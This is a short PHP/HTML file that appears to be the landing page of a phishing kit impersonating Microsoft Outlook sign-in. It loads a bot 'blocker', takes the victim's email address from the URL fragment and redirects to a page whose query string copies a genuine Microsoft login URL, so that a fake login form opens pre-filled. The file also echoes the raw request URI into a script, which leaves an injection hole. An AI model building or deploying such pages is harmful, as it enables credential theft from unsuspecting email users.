<?php
    session_start();
    require 'core/functions.php';
    require 'core/blocker.php';
    require 'config/config.php';
    $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

    if(isset($_SESSION['email']))
    {
        if(!empty($_SESSION['email']))
        {
            echo '<script>window.location = "login.php";</script>';
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <script type="text/javascript">
        if(window.location.hash) {
            var url = window.location.href;
            var hash = url.split('#').pop();

            window.location.replace("<?php echo $actual_link; ?>another.php?wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&email="+hash);
        } else {
          window.location.replace("<?php echo $actual_link; ?>login.php");
        }

    </script>
</head>
<body>
</body>
</html>